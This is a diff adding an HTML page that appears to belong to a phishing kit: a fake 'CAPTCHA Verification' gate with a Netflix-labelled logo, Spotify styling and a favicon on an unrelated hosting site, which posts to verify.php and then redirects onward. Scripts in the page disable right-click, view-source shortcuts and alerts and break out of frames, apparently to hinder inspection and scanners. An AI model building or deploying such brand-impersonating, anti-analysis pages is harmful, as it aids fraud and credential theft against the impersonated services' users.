@@ -1,0 +1,193 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8" content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="https://ilv.oui.mybluehost.me/MUSICAL/spotifycaptcha//spotify_icon_136176.png" rel="shortcut icon"/>
+<title>CAPTCHA Verification</title>
+<style>
+    
+    
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+            background-color: #040f13;
+            color: #fff;
+        }
+
+        .logo {
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        .logo img {
+            max-width: 200px; /* Adjust the size as needed */
+        }
+
+        /* Styles for the container */
+        .container {
+            text-align: center;
+            background-color: #000;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            margin-bottom: 20px;
+        }
+
+        .captcha-box img {
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            margin-bottom: 10px;
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            width: 200px; /* Adjust width as needed */
+            text-align: center;
+        }
+
+        button {
+            padding: 18px 100px;
+            background-color: #1ed760;
+            color: #000;
+            border: 2px solid white;
+            border-radius: 250px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #169c46;
+        }
+
+        .error-text {
+            color: red;
+            margin-top: 10px;
+        }
+        
+        
+    button:disabled {
+    background-color: #ccc; /* Change the background color */
+    color: #666; /* Change the text color */
+    cursor: not-allowed; /* Change cursor style */
+    /* Add any other styles to visually indicate it's disabled */
+    opacity: 0.7; /* Example: Reduce opacity */
+  }
+
+    
+    
+</style>
+<style>
+        html {
+            display: none;
+        }
+    </style>
+<script>
+        if (self == top) {
+            document.documentElement.style.display = 'block';
+        } else {
+            top.location = self.location;
+        }
+    </script>
+<style>
+        /* Obfuscated CSS */
+        .a { display: none !important; }
+        .b { visibility: hidden !important; }
+        .c { opacity: 0 !important; }
+    </style>
+<script>
+        // Obfuscated JavaScript
+        (function() {
+            var originalAlert = window.alert;
+            window.alert = function() {
+                console.log("Alerts are disabled.");
+            };
+
+            document.addEventListener("contextmenu", function(e) {
+                e.preventDefault();
+            });
+
+            document.addEventListener("keydown", function(e) {
+                if ((e.ctrlKey || e.metaKey) && (e.key === "u" || e.key === "U")) {
+                    e.preventDefault();
+                }
+            });
+        })();
+    </script>
+</head>
+<body>
+<div class="logo">
+<img alt="Netflix Logo" src="local_resources/img/c6f0bfcd678ff44b86e9a9a37748d84e.png"/>
+</div>
+<div class="container">
+<h1>CAPTCHA Verification</h1>
+<form action="verify.php" id="captchaForm" method="POST">
+<div class="captcha-box">
+<img alt="CAPTCHA Image" id="captchaImage" src="local_resources/img/071ed1187909263d93ca57b7024eaf56.php"/>
+<input maxlength="6" name="captchaInput" placeholder="Enter CAPTCHA" required="" type="text"/>
+</div>
+<p class="error-text" id="errorText"></p>
+<button id="verifyButton" type="submit">Verify</button>
+</form>
+</div>
+<script>
+  document.getElementById('captchaForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    let captchaInput = document.getElementsByName('captchaInput')[0].value;
+    let verifyButton = document.getElementById('verifyButton'); // Get the button element
+
+    fetch('verify.php', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: 'captchaInput=' + captchaInput
+    })
+    .then(response => response.text())
+    .then(data => {
+      if (data.trim() === 'success') {
+        verifyButton.disabled = true; // Disable the button upon successful verification
+        verifyButton.textContent = 'Redirecting...'; // Optionally change button text
+        window.location.href = '../verify';
+      } else {
+        document.getElementById('errorText').textContent = "Incorrect CAPTCHA! Please try again.";
+        document.getElementById('captchaImage').src = 'captcha.php?' + new Date().getTime();
+        document.getElementsByName('captchaInput')[0].value = '';
+      }
+    })
+    .catch(error => console.error('Error:', error));
+  });
+</script>
+</body>
+</html>
